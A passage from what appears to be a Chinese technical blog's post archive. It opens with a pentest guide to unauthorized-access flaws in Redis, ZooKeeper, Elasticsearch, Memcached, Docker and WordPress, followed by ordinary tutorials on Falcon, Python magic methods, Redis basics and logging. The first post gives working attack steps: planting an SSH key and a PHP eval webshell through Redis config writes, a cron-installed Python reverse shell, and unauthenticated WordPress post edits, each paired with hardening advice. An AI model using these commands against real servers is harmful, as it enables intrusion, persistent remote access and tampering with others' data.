写ssh-keygen公钥登录服务器利用条件：121.redis对外开放，且未授权访问（默认配置）2.服务器的ssh对外开放，可通过key登录 详细攻击方式如下：123456789101112131415161718准备好自己的公钥，写入本地文件text.txt。$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; test.txt2. 通过redis将该文件写入内存$ redis-cli -h 10.0.0.1 flushall$ cat test.txt | redis-cli -h 10.0.0.1 -x set crackit3. 利用redis-cli 写入配置的方式将公钥写入到.ssh目录下$ redis-cli -h 10.0.0.110.0.0.1:6379&gt; config set dir /Users/nmask/.ssh/OK10.0.0.1:6379&gt; config get dir1) "dir"2) "/Users/nmask/.ssh"10.0.0.1:6379&gt; config set dbfilename "authorized_keys"OK10.0.0.1:6379&gt; saveOK 获取web服务的webshell当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell。1234config set dir /var/www/html/config set dbfilename shell.phpset x "&lt;?php @eval($_POST['test']);?&gt;"save 说明：执行以上命令，即可将shell写入web目录。 漏洞修复到redis安装目录下，配置redis.conf文件：1、默认只对本地开放bind 127.0.0.12、添加登陆密码requirepass www.secpulse.com3、在需要对外开放的时候修改默认端口port 23334、最后还可以配合iptables限制开放 ZooKeeper未授权访问漏洞漏洞描述安装zookeeper之后默认是没有账号密码的，即没有权限校验，可被远程利用，通过目标服务器收集敏感信息，或者破坏zookeeper集群。 漏洞检测123456s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((ip, port))s.send("envi")result = s.recv(1024)if "zookeeper.version" in result: print "exist vul" 漏洞利用执行以下命令即可远程获取该服务器的环境：1echo envi | nc ip port 直接连接：1./zkCli.sh -server ip:port 漏洞修复1、禁止把Zookeeper直接暴露在公网2、添加访问控制，根据情况选择对应方式（认证用户，用户名密码）3、绑定指定IP访问 Elasticsearch未授权访问漏洞描述ELK是一款日志分析工具，默认监听9200端口，如果没有设置访问权限，可被非法操作数据。 漏洞检测12345conn = httplib.HTTPConnection(ip, port, True, TIMEOUT)conn.request("GET", '/_cat/master')resp = conn.getresponse()if resp.status == 200: print "exist vul" 漏洞利用相当于一个API，任何人访问这个地址，就可以调用api，进行数据的增删改操作。http://x.x.x.x:9200/_nodeshttp://x.x.x.x:9200/_river 漏洞修复1、防火墙上设置禁止外网访问9200端口。2、使用Nginx搭建反向代理，通过配置Nginx实现对Elasticsearch的认证3、限制IP访问，绑定固定IP4、在config/elasticsearch.yml中为9200端口设置认证：1234http.basic.enabled true #开关，开启会接管全部HTTP连接http.basic.user "admin" #账号http.basic.password "admin_pw" #密码http.basic.ipwhitelist ["localhost", "127.0.0.1"] memcache未授权访问漏洞描述memcached是一套常用的key-value缓存系统，其本身并没有权限控制模块，因此攻击者通过命令交互可直接读取memcached中的敏感信息。 漏洞检测123456s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((ip, port))s.send("stats")result = s.recv(1024)if "STAT version" in result: print "exist vul" 漏洞利用1nc -vv &lt;target&gt; 11211 说明：连接成功，则可获取memcached中的敏感信息。 漏洞修复1、设置memchached只允许本地访问2、禁止外网访问Memcached 11211端口3、编译时加上–enable-sasl，启用SASL认证 Docker未授权访问漏洞描述Docker Remote API是一个取代远程命令行界面（rcli）的REST API。通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。 漏洞检测12345conn = httplib.HTTPConnection(ip, port, True, TIMEOUT)conn.request("GET", '/containers/json')resp = conn.getresponse()if resp.status == 200 and "HostConfig" in resp.read(): print "exist vul" 漏洞利用获取所有images1http://host:2375/containers/json getshell的方式与redis利用差不多。 利用计划任务反弹shell1echo -e "*/1 * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n" &gt;&gt; /etc/crontab 漏洞修复1、在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：设置ACL，仅允许信任的来源IP连接；设置TLS认证，官方的文档为Protect the Docker daemon socket2、客户端连接时需要设置以下环境变量export DOCKER_TLS_VERIFY=1123export DOCKER_CERT_PATH=~/.dockerexport DOCKER_HOST=tcp://10.10.10.10:2375export DOCKER_API_VERSION=1.12 3、在 docker api 服务器前面加一个代理，例如 nginx，设置 401 认证 wordpress未授权访问漏洞漏洞描述wordpress未经授权的攻击者利用该漏洞可注入恶意内容，以及进行提权，对文章、页面等内容进行修改。REST API是最近添加到WordPress 4.7.0并默认启用的。 漏洞利用查看文章列表:1GET /index.php/wp-json/wp/v2/posts HTTP/1.1 修改文章内容：123456POST /index.php/wp-json/wp/v2/posts/500?id=500 HTTP/1.1Host: xxx.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36Content-Type: application/jsonContent-Length: 43&#123;"title":"x x x x"&#125; 说明：如果返回 401 则无权限修改；返回200表示修改成功。 参考文章https://www.secpulse.com/archives/61101.htmlhttps://www.secpulse.com/archives/40406.htmlhttp://www.freebuf.com/vuls/126120.html]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>未授权访问漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Falcon For Python REST API]]></title>
    <url>../../../../../../../../2017/11/27/1/</url>
    <content type="text"><![CDATA[一杯敬明天，一杯敬过往 说到Web Api，以往我一直使用Django来写，但众所周知Django框架很厚重，用来写web Api未免显得不够简便。虽然Django有一个专门写Api的框架，Django REST Framework（适合写比较复杂的Api，后面我会单独成文介绍），但感觉还是偏厚重了点。那么有没有几行代码就能写出一个Api的方案呢？Falcon框架就是为此而生的。(除此之外，Flask等框架也可用来写Api，但个人认为最轻便的就属Falcon了) Falcon是一个构建云Api的高性能Python框架，它鼓励使用REST架构风格，尽可能以最少的力气做最多的事情，简单来说它就是用来写Web Api的，有多简便，往下看了就知道。 Falcon官方文档：http://falcon.readthedocs.io/en/stable/api/request_and_response.htmlFalcon开源地址：https://github.com/falconry/falcon Falcon安装1pip install falcon Falcon写一个简单的api新建一个app.py文件，写入以下内容：123456789101112131415161718192021222324252627282930from wsgiref import simple_serverimport falconclass HelloWorld(object): def on_get(self, req, resp): print req.context print req.scheme print req.params resp.status = falcon.HTTP_200 resp.body = ('Get hello world') def on_post(self, req, resp): print req.stream.read() 获取post_data resp.status = falcon.HTTP_200 resp.body = ('Post hello world')app = falcon.API()hello = HelloWorld()app.add_route('/', hello)if __name__ == '__main__': httpd = simple_server.make_server('127.0.0.1', 8000, app) httpd.serve_forever() 运行app.py文件：1python app.py 运行程序将会在本地监听8000端口，我们可以使用curl或者http工具测试一番：先发一个GET请求：123456789http GET http://127.0.0.1:8000/HTTP/1.0 200 OKDate: Mon, 27 Nov 2017 11:50:36 GMTServer: WSGIServer/0.1 Python/2.7.10content-length: 15content-type: application/json; charset=UTF-8Get hello world 尝试发POST请求：123456789http POST http://127.0.0.1:8000/HTTP/1.0 200 OKDate: Mon, 27 Nov 2017 11:50:45 GMTServer: WSGIServer/0.1 Python/2.7.10content-length: 16content-type: application/json; charset=UTF-8Post hello world 说明：Falcon支持任何类型的请求，比如OPTIONS，PUT，HEAD等，当然前提是需要在app.py代码中定义，定义方式为on_*，比如：on_get、on_post、on_put等。 更复杂一些的api例子，可以参考官网。关于request与response的一些方法，官网有很详细的介绍，这里不再记录。 使用gunicorn代替内置的服务器使用python app.py的方式运行api，其实是使用了其内置的服务器，类似于django的manage.py。用于生产环境时，通常会使用gunicorn来代替内置的服务器，当然代码也可以简略为：12345678910111213141516171819202122import falconclass HelloWorld(object): def on_get(self, req, resp): print req.context print req.scheme print req.params resp.status = falcon.HTTP_200 resp.body = ('Get hello world') def on_post(self, req, resp): resp.status = falcon.HTTP_200 resp.body = ('Post hello world')app = falcon.API()hello = HelloWorld()app.add_route('/', hello) 安装gunicorn1pip install gunicorn 使用gunicorn1gunicorn app:app -b 127.0.0.1:8080 注意：:前的app是指app.py，:后的app是指app.py文件中的app对象。 gunicorn只支持unix（linux、mac），如果是windows用户，可用waitress替代。12$ pip install waitress$ waitress-serve --port=8000 app:app 关于gunicorn更多的用法，比如指定端口号之类的，可以gunicorn --help查看帮助。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>falcon</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python魔术方法]]></title>
    <url>../../../../../../../../2017/11/22/1/</url>
    <content type="text"><![CDATA[一杯敬朝阳，一杯敬月光 所谓魔术方法，就是在自定义类中定义一些”不一般”的方法，使类的封装更完善功能更健全，是一种python特有的方法。它们的方法名一般是__xx__这样的格式，比如最常见的__init__，就是一种魔术方法。下面我介绍一些在定义类中常见的魔术方法，并附上测试代码，请各位自行体验一下其美妙的魔术魅力吧。 魔术方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172#! -*- coding:utf-8 -*-class ClassTest(object): def __new__(cls,*args,**kwargs): ''' 初始化操作，类实例化时第一个被调用的方法 与__init__方法一起构成构造函数 ''' return object.__new__(cls) def __init__(self, _list=["1","2","3","4","5"] , _dict=&#123;"a":1,"b":2&#125;): ''' 初始化操作 ''' self._list = _list self._dict = _dict def __del__(self): ''' 删除变量 ''' del self._list del self._dict def __call__(self, item): ''' Usage: &gt;&gt;&gt;&gt;func=ClassTest() &gt;&gt;&gt;&gt;print func("nmask") &gt;&gt;&gt;&gt;nmask ''' return item def __len__(self): ''' 返回对象的长度 Usage: &gt;&gt;&gt;&gt;print len(ClassTest()) &gt;&gt;&gt;&gt;5 ''' return len(self._list) def __getitem__(self, key): ''' 通过下标取出对象的值 Usage: &gt;&gt;&gt;print ClassTest()["a"] &gt;&gt;&gt;1 ''' if key not in self._dict: return self.__missing__(key) return self._dict[key] def __missing__(self,key): ''' 当key不在dict中被调用 ''' return "%s is not in dict" % key def __setitem__(self, key, value): ''' 设置对象的值 Usage: ClassTest()['a']='12345' ''' self._dict[key] = value def __delitem__(self, key): ''' 删除对象 ''' del self._dict[key] def __getattr__(self, item): '''当访问对象不存在的属性时，调用此类 Usage: &gt;&gt;&gt;ClassTest().abc ''' return "class is not exists %s method" % item def __contains__(self, item): ''' not in or in 判断元素是否在其中 Usage: &gt;&gt;&gt;if "1" in ClassTest() &gt;&gt;&gt; ''' return item in self._list def __iter__(self): ''' 创建一个迭代器 Usage: &gt;&gt;&gt;for i in ClassTest(): &gt;&gt;&gt; print i ''' return iter(self._list) def __reversed__(self): ''' 反转列表 Usage: &gt;&gt;&gt;for i in reversed(ClassTest()): &gt;&gt;&gt; print i ''' return reversed(self._list) def __str__(self): '''用于处理打印实例本身的时候的输出内容,默认为对象名称和内存地址 Usage: &gt;&gt;&gt;print ClassTest() ''' return "This is a Test Class for Python Magic Method" def __repr__(self): ''' 序列化对象 Usage: &gt;&gt;&gt;repr(ClassTest()) ''' return repr(self._dict) def run(self): return self._dictif __name__=="__main__": if "1" in ClassTest(): print "调用了类的__contains__方法：1 is in _list" print "调用了类的__missing__方法：",ClassTest()["aaa"] for i in reversed(ClassTest()): print "调用了类的__iter__方法：",i print "调用了类的__getattr__方法：",ClassTest().abc print "调用了类的__repr__方法：",repr(ClassTest()) print "调用了类的__str__方法：",ClassTest() print "调用了类的__len__方法：",len(ClassTest()) print "调用了类的__setitem__方法：ClassTest()['a']='12345'" ClassTest()["a"]="12345" print "调用了类的__getitem__方法：",ClassTest()["a"] for i in ClassTest(): print "调用了类的__iter__方法：",i 运行结果：123456789101112131415161718调用了类的__contains__方法：1 is in _list调用了类的__missing__方法： aaa is not in dict调用了类的__iter__方法： 5调用了类的__iter__方法： 4调用了类的__iter__方法： 3调用了类的__iter__方法： 2调用了类的__iter__方法： 1调用了类的__getattr__方法： class is not exists abc method调用了类的__repr__方法： &#123;'a': 1, 'b': 2&#125;调用了类的__str__方法： This is a Test Class for Python Magic Method调用了类的__len__方法： 5调用了类的__setitem__方法：ClassTest()['a']='12345'调用了类的__getitem__方法： 12345调用了类的__iter__方法： 1调用了类的__iter__方法： 2调用了类的__iter__方法： 3调用了类的__iter__方法： 4调用了类的__iter__方法： 5 更多魔术方法，参考：http://python.jobbole.com/88367/]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis相关笔记]]></title>
    <url>../../../../../../../../2017/11/15/1/</url>
    <content type="text"><![CDATA[You’re uinique, nothing can replace you你举世无双，无人可以替代 记录一下redis的安装以及使用相关笔记，以防遗忘。我个人认为redis跟rabbitmq以及mysql比较起来，算是比较简单的，当然这跟我才接触使用redis有关，使用的也比较初级。以后有关redis相关的问题我都会记录在本篇，本次就先记录最基础的安装过程，使用方式吧。 redis安装mac上安装redis1brew install redis centos上安装redis1234$ wget http://download.redis.io/releases/redis-2.8.17.tar.gz$ tar xzf redis-2.8.17.tar.gz $ cd redis-2.8.17$ make 说明：编译完成后，会在目录下出现编译后的redis服务程序redis-server、redis-cli,位于安装目录 src下，可设置系统环境变量。 ubuntu安装redis12$sudo apt-get update$sudo apt-get install redis-server 启动redis服务1$ ./redis-server 或者：12systemctl start redissystemctl enable redis 指定配置文件的方式启动：1$ ./redis-server redis.conf 说明：redis.conf是一个默认的配置文件，我们可以根据需要使用自己的配置文件。 查看redis监听状态默认情况下，redis监听6379端口，可通过配置文件修改。1netstat -tlnp | grep "redis" redis-cli默认安装完redis后，就会安装服务端与客户端链接工具，即redis-cli. 连接redis服务端本地连接，将会默认链接本地的redis服务。1$ redis-cli 远程连接，将会连接远程服务器上的redis服务，若没有密码，则不需要写-a参数。1$ redis-cli -h host -p port -a password 测试redis服务端测试是否设置了密码123CONFIG get requirepass 1) "requirepass"2) "" 说明：以上输出表示没有设置密码，redis默认是没有设置密码的。设置密码:1CONFIG set requirepass "nmask" 验证密码:1AUTH "nmask" 测试服务端是否运行:12redis 127.0.0.1:6379&gt; PINGPONG 说明：返回PONG表示运行正常。 获取服务端信息1redis 127.0.0.1:6379&gt;INFO 设置键值(key)创建key：12redis 127.0.0.1:6379&gt; SET nmask "cool" OK 获取key的值:12redis 127.0.0.1:6379&gt; GET nmask cool 删除key:1redis 127.0.0.1:6379&gt; DEL nmask 说明：以上三个是最常用的命令（针对string类型，其他类型的请往下看），当然还有很多高级语法。 获取所有的key：1redis 127.0.0.1:6379&gt; keys * 检查给定key是否存在：1redis 127.0.0.1:6379&gt; EXISTS key redis数据结构简单说，数据结构即redis存储数据的格式，不同的数据结构，操作使用的命令也不一样。 字符串1234redis 127.0.0.1:6379&gt; SET url "https://thief.one"OKredis 127.0.0.1:6379&gt; GET url"https://thief.one" 哈希值12345678910redis 127.0.0.1:6379&gt; HMSET user:1 username nmask password nmask points 200OKredis 127.0.0.1:6379&gt; HGETALL user:11) "username"2) "nmask"3) "password"4) "nmask"5) "points"6) "200"redis 127.0.0.1:6379&gt; 列表1234567891011redis 127.0.0.1:6379&gt; lpush ziqiangxuetang.com redis(integer) 1redis 127.0.0.1:6379&gt; lpush ziqiangxuetang.com mongodb(integer) 2redis 127.0.0.1:6379&gt; lpush ziqiangxuetang.com rabitmq(integer) 3redis 127.0.0.1:6379&gt; lrange ziqiangxuetang.com 0 101) "rabitmq"2) "mongodb"3) "redis"redis 127.0.0.1:6379&gt; set集合12345678910111213redis 127.0.0.1:6379&gt; sadd ziqiangxuetang.com redis(integer) 1redis 127.0.0.1:6379&gt; sadd ziqiangxuetang.com mongodb(integer) 1redis 127.0.0.1:6379&gt; sadd ziqiangxuetang.com rabitmq(integer) 1redis 127.0.0.1:6379&gt; sadd ziqiangxuetang.com rabitmq(integer) 0redis 127.0.0.1:6379&gt; smembers ziqiangxuetang.com1) "rabitmq"2) "mongodb"3) "redis" zset有序集合12345678910111213redis 127.0.0.1:6379&gt; zadd ziqiangxuetang.com 0 redis(integer) 1redis 127.0.0.1:6379&gt; zadd ziqiangxuetang.com 0 mongodb(integer) 1redis 127.0.0.1:6379&gt; zadd ziqiangxuetang.com 0 rabitmq(integer) 1redis 127.0.0.1:6379&gt; zadd ziqiangxuetang.com 0 rabitmq(integer) 0redis 127.0.0.1:6379&gt; ZRANGEBYSCORE ziqiangxuetang.com 0 10001) "redis"2) "mongodb"3) "rabitmq" redis配置Redis的配置文件位于Redis安装目录下，文件名为redis.conf；修改配置可以通过修改redis.conf文件，或者命令行修改配置两种方式。 命令行方式基本命令格式：1redis 127.0.0.1:6379&gt; CONFIG GET CONFIG_SETTING_NAME 获取所有配置项：1redis 127.0.0.1:6379&gt; CONFIG GET * 设置日志级别：12345redis 127.0.0.1:6379&gt; CONFIG SET loglevel "notice"OKredis 127.0.0.1:6379&gt; CONFIG GET loglevel1) "loglevel"2) "notice" 配置文件redis.conf 配置项说明如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341. Redis默认不是以守护进程的方式运行，可以通过该配置项修改，使用yes启用守护进程 daemonize no2. 当Redis以守护进程方式运行时，Redis默认会把pid写入/var/run/redis.pid文件，可以通过pidfile指定 pidfile /var/run/redis.pid3. 指定Redis监听端口，默认端口为6379，作者在自己的一篇博文中解释了为什么选用6379作为默认端口，因为6379在手机按键上MERZ对应的号码，而MERZ取自意大利歌女Alessia Merz的名字 port 63794. 绑定的主机地址 bind 127.0.0.15.当 客户端闲置多长时间后关闭连接，如果指定为0，表示关闭该功能 timeout 3006. 指定日志记录级别，Redis总共支持四个级别：debug、verbose、notice、warning，默认为verbose loglevel verbose7. 日志记录方式，默认为标准输出，如果配置Redis为守护进程方式运行，而这里又配置为日志记录方式为标准输出，则日志将会发送给/dev/null logfile stdout8. 设置数据库的数量，默认数据库为0，可以使用SELECT &lt;dbid&gt;命令在连接上指定数据库id databases 169. 指定在多长时间内，有多少次更新操作，就将数据同步到数据文件，可以多个条件配合 save &lt;seconds&gt; &lt;changes&gt; Redis默认配置文件中提供了三个条件： save 900 1 save 300 10 save 60 10000 分别表示900秒（15分钟）内有1个更改，300秒（5分钟）内有10个更改以及60秒内有10000个更改。10. 指定存储至本地数据库时是否压缩数据，默认为yes，Redis采用LZF压缩，如果为了节省CPU时间，可以关闭该选项，但会导致数据库文件变的巨大 rdbcompression yes11. 指定本地数据库文件名，默认值为dump.rdb dbfilename dump.rdb12. 指定本地数据库存放目录 dir ./13. 设置当本机为slav服务时，设置master服务的IP地址及端口，在Redis启动时，它会自动从master进行数据同步 slaveof &lt;masterip&gt; &lt;masterport&gt;14. 当master服务设置了密码保护时，slav服务连接master的密码 masterauth &lt;master-password&gt;15. 设置Redis连接密码，如果配置了连接密码，客户端在连接Redis时需要通过AUTH &lt;password&gt;命令提供密码，默认关闭 requirepass foobared16. 设置同一时间最大客户端连接数，默认无限制，Redis可以同时打开的客户端连接数为Redis进程可以打开的最大文件描述符数，如果设置 maxclients 0，表示不作限制。当客户端连接数到达限制时，Redis会关闭新的连接并向客户端返回max number of clients reached错误信息 maxclients 12817. 指定Redis最大内存限制，Redis在启动时会把数据加载到内存中，达到最大内存后，Redis会先尝试清除已到期或即将到期的Key，当此方法处理 后，仍然到达最大内存设置，将无法再进行写入操作，但仍然可以进行读取操作。Redis新的vm机制，会把Key存放内存，Value会存放在swap区 maxmemory &lt;bytes&gt;18. 指定是否在每次更新操作后进行日志记录，Redis在默认情况下是异步的把数据写入磁盘，如果不开启，可能会在断电时导致一段时间内的数据丢失。因为 redis本身同步数据文件是按上面save条件来同步的，所以有的数据会在一段时间内只存在于内存中。默认为no appendonly no19. 指定更新日志文件名，默认为appendonly.aof appendfilename appendonly.aof20. 指定更新日志条件，共有3个可选值： no：表示等操作系统进行数据缓存同步到磁盘（快） always：表示每次更新操作后手动调用fsync()将数据写到磁盘（慢，安全） everysec：表示每秒同步一次（折衷，默认值） appendfsync everysec21. 指定是否启用虚拟内存机制，默认值为no，简单的介绍一下，VM机制将数据分页存放，由Redis将访问量较少的页即冷数据swap到磁盘上，访问多的页面由磁盘自动换出到内存中（在后面的文章我会仔细分析Redis的VM机制） vm-enabled no22. 虚拟内存文件路径，默认值为/tmp/redis.swap，不可多个Redis实例共享 vm-swap-file /tmp/redis.swap23. 将所有大于vm-max-memory的数据存入虚拟内存,无论vm-max-memory设置多小,所有索引数据都是内存存储的(Redis的索引数据 就是keys),也就是说,当vm-max-memory设置为0的时候,其实是所有value都存在于磁盘。默认值为0 vm-max-memory 024. Redis swap文件分成了很多的page，一个对象可以保存在多个page上面，但一个page上不能被多个对象共享，vm-page-size是要根据存储的 数据大小来设定的，作者建议如果存储很多小对象，page大小最好设置为32或者64bytes；如果存储很大大对象，则可以使用更大的page，如果不 确定，就使用默认值 vm-page-size 3225. 设置swap文件中的page数量，由于页表（一种表示页面空闲或使用的bitmap）是在放在内存中的，，在磁盘上每8个pages将消耗1byte的内存。 vm-pages 13421772826. 设置访问swap文件的线程数,最好不要超过机器的核数,如果设置为0,那么所有对swap文件的操作都是串行的，可能会造成比较长时间的延迟。默认值为4 vm-max-threads 427. 设置在向客户端应答时，是否把较小的包合并为一个包发送，默认为开启 glueoutputbuf yes28. 指定在超过一定的数量或者最大的元素超过某一临界值时，采用一种特殊的哈希算法 hash-max-zipmap-entries 64 hash-max-zipmap-value 51229. 指定是否激活重置哈希，默认为开启（后面在介绍Redis的哈希算法时具体介绍） activerehashing yes30. 指定包含其它的配置文件，可以在同一主机上多个Redis实例之间使用同一份配置文件，而同时各个实例又拥有自己的特定配置文件 include /path/to/local.conf redis+pythonpython有专门操作redis的第三方模块，项目地址：https://github.com/WoLpH/redis-py 安装pyredis1pip install redis 或者github下载源码安装：1python setup.py install 连接redis服务123456&gt;&gt;&gt; pool = redis.ConnectionPool(host='127.0.0.1', port=6379, password="")&gt;&gt;&gt; conn = redis.Redis(connection_pool=pool)&gt;&gt;&gt; conn.set('hello','world')True&gt;&gt;&gt; conn.get('hello')b'world' 更多python+redis用法，请移步：http://python.jobbole.com/87305/ redis安全清空所有数据：1redis 127.0.0.1:6379&gt; flushall 说明：因此redis密码不能为空，redis缺省是没有密码的，至于这么设置密码，请从上文中找找。 参考文章http://python.jobbole.com/87305/http://www.runoob.com/redis/redis-install.html]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[logging for python]]></title>
    <url>../../../../../../../../2017/11/10/1/</url>
    <content type="text"><![CDATA[远距离的欣赏，近距离的迷惘 开发项目中缺不了日志控制，而在python中编写日志往往选择封装logging库，因为logging库足够强大，且支持自由配置。今日在开发项目的过程中，折腾了logging好一会儿，在此记录一下。 logging模块日志级别（level）：1CRITICAL &gt; ERROR &gt; WARNING &gt; INFO &gt; DEBUG &gt; NOTSET logging基础使用12345678910import logginglogging.debug('This is debug message')logging.info('This is info message')logging.warning('This is warning message')logging.error('This is error message')&gt;&gt;&gt;运行结果WARNING:root:This is warning messageERROR:root:This is error message 说明：运行程序将直接在控制台输出日志内容，默认情况下日志级别为WARNING，即级别大于等于WARNING的日志才会被输出。 logging.basicConfig通过basiConfig函数对logging日志进行配置：123456789101112import logginglogging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s', datefmt='%a, %d %b %Y %H:%M:%S', filename='test.log', filemode='w') logging.debug('This is debug message')logging.info('This is info message')logging.warning('This is warning message')logging.error('This is error message') 说明：运行程序将不会在控制台有任何输出，而是生成了一个test.log文件，文件内容为：1234Fri, 10 Nov 2017 15:04:44 logging_test.py[line:20] DEBUG This is debug messageFri, 10 Nov 2017 15:04:44 logging_test.py[line:21] INFO This is info messageFri, 10 Nov 2017 15:04:44 logging_test.py[line:22] WARNING This is warning messageFri, 10 Nov 2017 15:04:44 logging_test.py[line:23] ERROR This is error message basicConfig函数参数：1234567891011121314151617filename: 指定日志文件名filemode: 和file函数意义相同，指定日志文件的打开模式，'w'或'a'format: 指定输出的格式和内容，format可以输出很多有用信息，如上例所示: %(levelno)s: 打印日志级别的数值 %(levelname)s: 打印日志级别名称 %(pathname)s: 打印当前执行程序的路径，其实就是sys.argv[0] %(filename)s: 打印当前执行程序名 %(funcName)s: 打印日志的当前函数 %(lineno)d: 打印日志的当前行号 %(asctime)s: 打印日志的时间 %(thread)d: 打印线程ID %(threadName)s: 打印线程名称 %(process)d: 打印进程ID %(message)s: 打印日志信息datefmt: 指定时间格式，同time.strftime()level: 设置日志级别，默认为logging.WARNINGstream: 指定将日志的输出流，可以指定输出到sys.stderr,sys.stdout或者文件，默认输出到sys.stderr，当stream和filename同时指定时，stream被忽略 StreamHandler将日志同时输出控制台以及记录到文件中，可以使用StreamHandler函数创建一个输出到console的流。123456789101112131415161718import logginglogging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s', datefmt='%a, %d %b %Y %H:%M:%S', filename='test.log', filemode='w')console = logging.StreamHandler()console.setLevel(logging.INFO)formatter = logging.Formatter('%(name)-12s: %(levelname)-8s %(message)s')console.setFormatter(formatter)logger=logging.getLogger('')logger.addHandler(console)logging.debug('This is debug message')logging.info('This is info message')logging.warning('This is warning message') logging.conf配置文件如果项目比较简单，以上的介绍已经足够使用了，但如果项目较大，建议使用配置文件的方式。 创建一个配置文件logger.conf1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162###################### loggers #########################[loggers]keys=root,scan,heart[logger_root]handlers=hand_console,hand_file_scanqualname=logger_rootpropagate=0level=INFO[logger_scan]handlers=hand_console,hand_file_scanqualname=logger_scanpropagate=0level=INFO[logger_heart]handlers=hand_console,hand_file_heartqualname=logger_heartpropagate=0level=INFO####################### handlers ########################[handlers]keys=hand_console,hand_file_scan,hand_file_heart[handler_hand_console]class=StreamHandlerlevel=WARNINGformatter=formargs=(sys.stderr,)[handler_hand_file_scan]class=FileHandlerlevel=INFOformatter=formargs=(os.getcwd()+"/log/"+time.strftime('%Y%m%d',time.localtime())+"/"+'scan.log', 'a')[handler_hand_file_heart]class=FileHandlerlevel=INFOformatter=formargs=(os.getcwd()+"/log/"+time.strftime('%Y%m%d',time.localtime())+"/"+'heart.log', 'a')##################### formatters ##########################[formatters]keys=form[formatter_form]format=%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)sdatefmt=%Y-%m-%d %X 加载使用配置文件123456789101112import loggingimport logging.configlogging.config.fileConfig("logger.conf") # 加载配置文件logger = logging.getLogger("logger_scan") # 选择logger为logger_scanlogger.info('This is info message')logger = logging.getLogger("logger_heart") # 选择logger为logger_heartlogger.info('This is info message')# 注意：logger_scan必须与配置文件中的名字一样，看到有些教程里面写的是scan，这是不对的，需要写全名。 说明：观察配置文件，可以看到loggers有三个，分别是root,scan,hearts；root是默认的，即config.fileConfig中不写表示选择root；然后scan logger 中的handlers是handler_console,handler_file_scan，说明这个logger有2个流，一个是输出到控制台的，一个是写入文件的。这几个handler中的formatter选项都一样，为formatter_form，即可以在这个选项中配置日志的格式。 handler配置说明 可以看到以上配置文件handler_console中的args参数，在console中使用sys.stderr，将会把输出到控制台；而另外2个handler的args参数的内容是文件地址，注意这个文件地址可以是静态地址，比如：test.log，也可以是动态生成的，比如上面使用当前日期生成的。之所以可以这么写，是因为配置文件将会被执行eval函数，因此可以在这个配置文件里面写python代码，将会被执行。 当然除了写入文件，输出到控制台外，logging还支持其他的日志记录方式，参考摘录自logging文档：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748[handler_hand02]class=FileHandlerlevel=DEBUGformatter=form02args=('python.log', 'w')[handler_hand03]class=handlers.SocketHandlerlevel=INFOformatter=form03args=('localhost', handlers.DEFAULT_TCP_LOGGING_PORT)[handler_hand04]class=handlers.DatagramHandlerlevel=WARNformatter=form04args=('localhost', handlers.DEFAULT_UDP_LOGGING_PORT)[handler_hand05]class=handlers.SysLogHandlerlevel=ERRORformatter=form05args=(('localhost', handlers.SYSLOG_UDP_PORT), handlers.SysLogHandler.LOG_USER)[handler_hand06]class=handlers.NTEventLogHandlerlevel=CRITICALformatter=form06args=('Python Application', '', 'Application')[handler_hand07]class=handlers.SMTPHandlerlevel=WARNformatter=form07args=('localhost', 'from@abc', ['user1@abc', 'user2@xyz'], 'Logger Subject')[handler_hand08]class=handlers.MemoryHandlerlevel=NOTSETformatter=form08target=args=(10, ERROR)[handler_hand09]class=handlers.HTTPHandlerlevel=NOTSETformatter=form09args=('localhost:9022', '/log', 'GET') 参考文章http://python.usyiyi.cn/translate/python_278/library/logging.config.htmlhttps://www.cnblogs.com/dkblog/archive/2011/08/26/2155018.html]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>logging</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Upload Package to Pypi]]></title>
    <url>../../../../../../../../2017/11/08/1/</url>
